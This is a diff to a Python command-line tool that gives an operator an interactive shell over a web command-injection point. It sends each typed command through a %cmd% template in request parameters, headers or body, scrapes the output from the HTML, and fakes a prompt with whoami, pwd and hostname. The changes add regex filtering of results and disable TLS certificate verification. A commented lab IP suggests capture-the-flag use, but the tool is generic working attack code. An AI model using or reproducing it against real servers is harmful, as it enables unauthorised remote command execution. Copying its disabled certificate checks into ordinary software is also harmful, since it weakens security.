@@ -1,12 +1,15 @@
 #!/usr/bin/python3
 import argparse
 import requests
+import re
 import logging
 import readline
 
 from bs4 import BeautifulSoup
 from urllib.parse import parse_qs
 
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 # Configure logging
@@ -33,13 +36,13 @@ def execute_command(url, method=METHOD_POST,params={}, headers={}, data={}):
 
     # Log the start of the function
     logging.debug(f"Starting request to URL: {method} - {url} - {params} - {headers}")
-
+    
     try:
         # Send the request to the server
         if method==METHOD_GET:
-            response = requests.get(url, params=params, headers=headers, data=data)
+            response = requests.get(url, params=params, headers=headers, data=data, verify=False)
         elif method==METHOD_POST:
-            response = requests.post(url, params=params, headers=headers, data=data)
+            response = requests.post(url, params=params, headers=headers, data=data, verify=False)
 
 
         # Log the HTTP status code
@@ -56,7 +59,7 @@ def execute_command(url, method=METHOD_POST,params={}, headers={}, data={}):
 
 from bs4 import BeautifulSoup
 
-def extract_result_from_command_return(html_content, str_valid_command_return, str_wrong_command_return, bs4_selector):
+def extract_result_from_command_return(html_content, str_valid_command_return, str_wrong_command_return, bs4_selector, regex):
     """
     Extracts the result from the command return in the given HTML content.
 
@@ -87,6 +90,19 @@ def extract_result_from_command_return(html_content, str_valid_command_return, s
         if selector_tags and len(selector_tags) > 0:
             # Get the text from the first tag and strip any surrounding whitespace
             cmd_result = selector_tags[0].get_text().strip()
+
+            if regex is not None:
+                try:
+                    result_groups=re.search(regex, cmd_result).groups()
+                    if len(result_groups) == 0:
+                        print(f"Regex {regex} produced no match, will not be applied.")
+                    elif len(result_groups) >1:
+                        print(f"Regex {regex} produced more than 1 match, will only take first.")
+                    cmd_result=result_groups[0]
+
+                except Exception as e:
+                    print(f"Regex {regex} produced an error, will not be applied.")
+                
 
             # Check if multiple tags were found and print a warning message
             if len(selector_tags) > 1:
@@ -135,7 +151,7 @@ def populate_template(cmd, temple_dict):
 
     return populated_dict
 
-def populate_template_and_execute_commands(command, str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data):
+def populate_template_and_execute_commands(command, str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data, regex):
     # init returned variables
     valid_result=False
     cmd_result=""
@@ -147,15 +163,15 @@ def populate_template_and_execute_commands(command, str_valid_command_return, st
     http_response, html_content = execute_command(url, method=method, params=populated_params, headers=populated_headers, data=populated_data)
 
     if html_content:
-        valid_result, cmd_result = extract_result_from_command_return(html_content, str_valid_command_return, str_wrong_command_return,bs4_selector)
-        soup = BeautifulSoup(html_content, 'html.parser')
+        valid_result, cmd_result = extract_result_from_command_return(html_content, str_valid_command_return, str_wrong_command_return,bs4_selector, regex)
+        # soup = BeautifulSoup(html_content, 'html.parser')
     else:
         valid_result, cmd_result= (False, "Command processed, but no specific condition met.")
 
     return valid_result, cmd_result
 
 
-def main(url, str_valid_command_return, str_wrong_command_return,bs4_selector="html", method=METHOD_POST, template_params={}, template_headers={}, template_data={"command": "%cmd%"}):
+def main(url, str_valid_command_return, str_wrong_command_return,bs4_selector="html", method=METHOD_POST, template_params={}, template_headers={}, template_data={"command": "%cmd%"}, regex=None):
     """
     Main function to handle user input and process commands.
     """
@@ -168,9 +184,9 @@ def main(url, str_valid_command_return, str_wrong_command_return,bs4_selector="h
     bs4_selector=bs4_selector
 
     # Get the user name of the server and current working directory
-    valid_result_whoami, user_name=populate_template_and_execute_commands("whoami", str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data)
-    valid_result_pwd, working_dir=populate_template_and_execute_commands("pwd", str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data)
-    valid_result_hostname, hostname=populate_template_and_execute_commands("hostname", str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data)
+    valid_result_whoami, user_name=populate_template_and_execute_commands("whoami", str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data, regex)
+    valid_result_pwd, working_dir=populate_template_and_execute_commands("pwd", str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data, regex)
+    valid_result_hostname, hostname=populate_template_and_execute_commands("hostname", str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data, regex)
     if not valid_result_whoami:
         user_name="swcli[fake]"
     if not valid_result_pwd:
@@ -195,7 +211,7 @@ def main(url, str_valid_command_return, str_wrong_command_return,bs4_selector="h
                 command_index = len(command_history)
 
             # Execute the command
-            valid_result, cmd_result= populate_template_and_execute_commands(command, str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data)
+            valid_result, cmd_result= populate_template_and_execute_commands(command, str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data, regex)
             if cmd_result != "": # do not display empty line
                 print(cmd_result)
 
@@ -235,6 +251,9 @@ def parse_arguments():
     # Add the -P argument, which can be specified multiple times
     parser.add_argument('-P', action='append', help='Add a query parameter to the request as a string. Use %%cmd%% to inject the command. Example: "command=%%cmd%%"')
 
+    # Add the --regex argument in order to specify a regex for the result of valid commands
+    parser.add_argument('--regex', required=False, help='A regular expression to select text after applying the --selector switch, if null, no regex will be applyed.')
+    
     # Parse the arguments
     args = parser.parse_args()
 
@@ -284,6 +303,8 @@ if __name__ == "__main__":
     str_wrong_command_return=args.wrong_cmd
     bs4_selector=args.selector
     method=args.method
+    regex=args.regex
+
     template_params=parse_request_elements(args.P)
     template_headers=parse_request_elements(args.H)
     template_data=parse_request_elements(args.D)
@@ -298,4 +319,4 @@ if __name__ == "__main__":
 
     # # url = input("Enter the URL:")
     # url = "http://10.10.244.7/secret/"
-    main(url, str_valid_command_return, str_wrong_command_return, bs4_selector, method=method, template_params=template_params, template_headers=template_headers, template_data=template_data)
+    main(url, str_valid_command_return, str_wrong_command_return, bs4_selector, method=method, template_params=template_params, template_headers=template_headers, template_data=template_data, regex=regex)
